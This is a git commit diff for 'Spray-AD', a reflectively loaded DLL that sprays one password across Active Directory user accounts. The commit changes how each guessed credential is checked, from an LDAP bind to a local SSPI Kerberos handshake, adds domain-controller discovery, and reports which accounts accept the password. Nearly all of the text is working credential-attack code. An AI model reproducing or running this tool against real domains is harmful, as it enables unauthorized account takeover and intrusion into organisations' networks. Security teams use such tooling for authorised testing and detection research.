fbfc5f1540679d8234cf443d9a6cc0919f2f1183
Cn33liz <Cornelis@deplaa.com>
2020-02-23 14:16:00 +0100

    SSPI Kerberos Update

---
+++ CHANGELOG.md
@@ -0,0 +1,5 @@
+### Changelog:
+
+#### Version 1.1:
+
+* Now uses pure SSPI Kerberos authentication instead of ADSI ADsOpenObject (ldap_bind) to validate creds.
--- Src/Spray-AD/Spray-AD/ReflectiveDll.cpp
+++ Src/Spray-AD/Spray-AD/ReflectiveDll.cpp
@@ -2,15 +2,23 @@
 #define _UNICODE
 #undef  UNICODE
 #define UNICODE
+#define SECURITY_WIN32
 
 #include "ReflectiveLoader.h"
 #include <stdio.h>
 #include <objbase.h>
 #include <activeds.h>
 #include <sddl.h>
+#include <DsGetDC.h>
+#include <lm.h>
+#include <security.h>
 
+#pragma comment(lib, "Netapi32.lib")
+#pragma comment(lib, "secur32.lib")
 #pragma comment(lib, "ADSIid.lib")
 #pragma comment(lib, "ActiveDS.Lib")
+
+PDOMAIN_CONTROLLER_INFO pdcInfo;
 
 // Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
 // defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
@@ -26,6 +34,152 @@ int IS_BUFFER_ENOUGH(UINT maxAlloc, LPWSTR pszTarget, LPCWSTR pszSource, int toC
 	}
 
 	return maxAlloc - (wcslen(pszTarget) + toCopy + 1);
+}
+
+BOOL LogonUserSSPI(LPWSTR pszSSP, LPWSTR pszAuthority, LPWSTR pszPrincipal, LPWSTR pszPassword) {
+	// Here's where we specify the credentials to verify:
+	SEC_WINNT_AUTH_IDENTITY_EXW authIdent = {
+		SEC_WINNT_AUTH_IDENTITY_VERSION,
+		sizeof authIdent,
+		(unsigned short *)pszPrincipal,
+		lstrlenW(pszPrincipal),
+		(unsigned short *)pszAuthority,
+		lstrlenW(pszAuthority),
+		(unsigned short *)pszPassword,
+		lstrlenW(pszPassword),
+		SEC_WINNT_AUTH_IDENTITY_UNICODE,
+		0, 0
+	};
+
+	// Get an SSPI handle for these credentials.
+	CredHandle hcredClient;
+	TimeStamp expiryClient;
+	SECURITY_STATUS Status = AcquireCredentialsHandle(0, pszSSP,
+		SECPKG_CRED_OUTBOUND,
+		0, &authIdent,
+		0, 0,
+		&hcredClient,
+		&expiryClient);
+	if (Status) {
+		return FALSE;
+	}
+
+	// Use the caller's credentials for the server.
+	CredHandle hcredServer;
+	TimeStamp expiryServer;
+	Status = AcquireCredentialsHandle(0, pszSSP,
+		SECPKG_CRED_INBOUND,
+		0, 0, 0, 0,
+		&hcredServer,
+		&expiryServer);
+	if (Status) {
+		return FALSE;
+	}
+
+	CtxtHandle hctxClient;
+	CtxtHandle hctxServer;
+
+	// Create two buffers:
+	//    one for the client sending tokens to the server,
+	//    one for the server sending tokens to the client
+	// (buffer size chosen based on current Kerb SSP setting for cbMaxToken - you may need to adjust this)
+	BYTE bufC2S[8000];
+	BYTE bufS2C[8000];
+	SecBuffer sbufC2S = { sizeof bufC2S, SECBUFFER_TOKEN, bufC2S };
+	SecBuffer sbufS2C = { sizeof bufS2C, SECBUFFER_TOKEN, bufS2C };
+	SecBufferDesc bdC2S = { SECBUFFER_VERSION, 1, &sbufC2S };
+	SecBufferDesc bdS2C = { SECBUFFER_VERSION, 1, &sbufS2C };
+
+	// Don't really need any special context attributes.
+	DWORD grfRequiredCtxAttrsClient = ISC_REQ_CONNECTION;
+	DWORD grfRequiredCtxAttrsServer = ISC_REQ_CONNECTION;
+
+	// Set up some aliases to make it obvious what's happening.
+	PCtxtHandle pClientCtxHandleIn = 0;
+	PCtxtHandle pClientCtxHandleOut = &hctxClient;
+	PCtxtHandle pServerCtxHandleIn = 0;
+	PCtxtHandle pServerCtxHandleOut = &hctxServer;
+
+	SecBufferDesc* pClientInput = 0;
+	SecBufferDesc* pClientOutput = &bdC2S;
+	SecBufferDesc* pServerInput = &bdC2S;
+	SecBufferDesc* pServerOutput = &bdS2C;
+
+	DWORD grfCtxAttrsClient = 0;
+	DWORD grfCtxAttrsServer = 0;
+	TimeStamp expiryClientCtx;
+	TimeStamp expiryServerCtx;
+
+	// Since the caller is acting as the server, we need a server principal name
+	// so that the client will be able to get a Kerb ticket (if Kerb is used).
+	WCHAR szSPN[256];
+	ULONG cchSPN = sizeof szSPN / sizeof *szSPN;
+	GetUserNameEx(NameSamCompatible, szSPN, &cchSPN);
+
+	// Perform the authentication handshake, playing the role of both client *and* server.
+	BOOL bClientContinue = TRUE;
+	BOOL bServerContinue = TRUE;
+	while (bClientContinue || bServerContinue) {
+		if (bClientContinue) {
+			sbufC2S.cbBuffer = sizeof bufC2S;
+			Status = InitializeSecurityContext(
+				&hcredClient, pClientCtxHandleIn,
+				szSPN,
+				grfRequiredCtxAttrsClient,
+				0, SECURITY_NATIVE_DREP,
+				pClientInput, 0,
+				pClientCtxHandleOut,
+				pClientOutput,
+				&grfCtxAttrsClient,
+				&expiryClientCtx);
+			switch (Status) {
+			case SEC_E_OK:
+				bClientContinue = FALSE;
+				break;
+			case SEC_I_CONTINUE_NEEDED:
+				pClientCtxHandleIn = pClientCtxHandleOut;
+				pClientInput = pServerOutput;
+				break;
+			default:
+				FreeCredentialsHandle(&hcredClient);
+				FreeCredentialsHandle(&hcredServer);
+				return FALSE;
+			}
+		}
+
+		if (bServerContinue) {
+			sbufS2C.cbBuffer = sizeof bufS2C;
+			Status = AcceptSecurityContext(
+				&hcredServer, pServerCtxHandleIn,
+				pServerInput,
+				grfRequiredCtxAttrsServer,
+				SECURITY_NATIVE_DREP,
+				pServerCtxHandleOut,
+				pServerOutput,
+				&grfCtxAttrsServer,
+				&expiryServerCtx);
+			switch (Status) {
+			case SEC_E_OK:
+				bServerContinue = FALSE;
+				break;
+			case SEC_I_CONTINUE_NEEDED:
+				pServerCtxHandleIn = pServerCtxHandleOut;
+				break;
+			default:
+				FreeCredentialsHandle(&hcredClient);
+				FreeCredentialsHandle(&hcredServer);
+				return FALSE;
+			}
+		}
+	}
+
+	// Clean up
+	FreeCredentialsHandle(&hcredClient);
+	FreeCredentialsHandle(&hcredServer);
+	DeleteSecurityContext(pServerCtxHandleOut);
+	DeleteSecurityContext(pClientCtxHandleOut);
+
+	return TRUE;
 }
 
 HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch pointer to Partitions container.
@@ -161,28 +315,19 @@ HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch poi
 											fflush(stdout);
 										}
 
-										IADs *pObject = NULL;
-										HRESULT hr = ADsOpenObject(L"LDAP://rootDSE",
-											col.pADsValues->CaseIgnoreString,
-											lpSprayPasswd,
-											ADS_SECURE_AUTHENTICATION | ADS_FAST_BIND, // Use Secure Authentication
-											IID_IADs,
-											(void**)&pObject);
-										if (FAILED(hr))
-										{
-											if (pObject)
-												pObject->Release();
+										BOOL bResult = LogonUserSSPI(L"Kerberos", 
+											pdcInfo->DomainName, 
+											col.pADsValues->CaseIgnoreString, 
+											(LPWSTR)lpSprayPasswd);
 
+										if (!bResult) {
 											dwAccountsFailed = dwAccountsFailed + 1;
 											dwAccountsTested = dwAccountsTested + 1;
 											break;
 										}
-										if (SUCCEEDED(hr))
-										{
+										if (bResult) {
 											wprintf(L"[+] Password correct for useraccount: %s\n", col.pADsValues->CaseIgnoreString);
 											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);											
-											if (pObject)
-												pObject->Release();
 
 											dwAccountsSuccess = dwAccountsSuccess + 1;
 											dwAccountsTested = dwAccountsTested + 1;
@@ -268,6 +413,17 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 
 			// Handle the command line arguments.
 			mbstowcs_s(&convertedChars, pwszParams, newsize, (LPSTR)lpReserved, _TRUNCATE);
+
+			// Get Domainame.
+			DWORD dwRet = DsGetDcName(NULL, NULL, NULL, NULL, 0, &pdcInfo);
+			if (dwRet != ERROR_SUCCESS) {
+				wprintf(L" [!] Failed to obtain Domainname.\n");
+				// Flush STDOUT
+				fflush(stdout);
+
+				// We're done, so let's exit
+				ExitProcess(0);
+			}
 
 			// Initialize COM
 			CoInitialize(NULL);
@@ -361,6 +517,8 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 			// Uninitialize COM
 			CoUninitialize();
 		}
+
+		NetApiBufferFree(pdcInfo);
 
 		// Flush STDOUT
 		fflush(stdout);
